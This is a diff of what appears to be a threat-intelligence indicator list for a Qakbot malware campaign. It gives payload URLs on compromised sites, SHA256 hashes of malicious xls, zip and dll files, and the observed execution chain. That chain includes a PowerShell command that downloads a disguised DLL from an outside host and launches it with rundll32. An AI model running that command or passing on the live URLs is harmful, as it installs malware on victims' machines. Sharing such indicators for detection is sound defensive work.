@@ -1,14 +1,27 @@
 31.05.2022 | Qakbot | AA | Campaign 1653985220 | Version 403.688
 
-******************************
+*************************************************
 
-.url https://nkic.edu.np/itet/aeuqutt
+.url https://nkic.edu.np/itet/aeuqutt (.xlsb)
+.url http://evoluicursos.com/ee/qiedsua (.lnk)
 .url HTTPS://projetomemoravel.com/hQfHMUFZg/FF.png
 .url HTTPS://apsosyal.com/8Hg65CnSrJd4/FF.png
 .url HTTPS://igitplacements.ac.in/olmkmS4I/FF.png
-.xls 593ddfe9dfe7fb77c416ba293e3e3f7a04a7df4fb102bde52ca151eda7f71820
-.dll c0b1646614e51c6d52c4727dd00e652d5b7b7e22c925f30013631fe6c5d368c7
-.dll fb83b074fcbd826d8ce389ec354473322159fe3c72cc1d90c04612c753e61b23
+.zip c14971d5e3ab98b929e40cc493462b120fadbfd21893f6d5819f3281ebb05c9b (lnk)
+.xls f1dc179d7a3aeb57b86d939b5b4d116b3b7778f9ac79b11d1c2e5a410436effa
+.dll 1176381ebfc60acd5078c5a6ac4ac5a0defffce6f1a6c1f6fbe830dd2df6c3e6
+.dll bde66b4246cfbb415549464b424ffd581885dc8a2b85cb2d2676ead4d66b64e8
+.dll c9c0e45015785baff7f64720ba9c3ec85e70506cf78a6e25e8f11bc6949aadbb
+
+*************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\form5.6.2021.lnk
+
+powershell.exe -NoE iwr -Uri https://projetomemoravel.com/hQfHMUFZg/FF.png -OutFile $env:TEMP\hjghu.dll;saps rundll32.exe $env:TEMP\hjghu.dll,DllRegisterServer
+
+rundll32.exe" C:\Users\Admin\AppData\Local\Temp\hjghu.dll DllRegisterServer 
 
 *************************************************
 
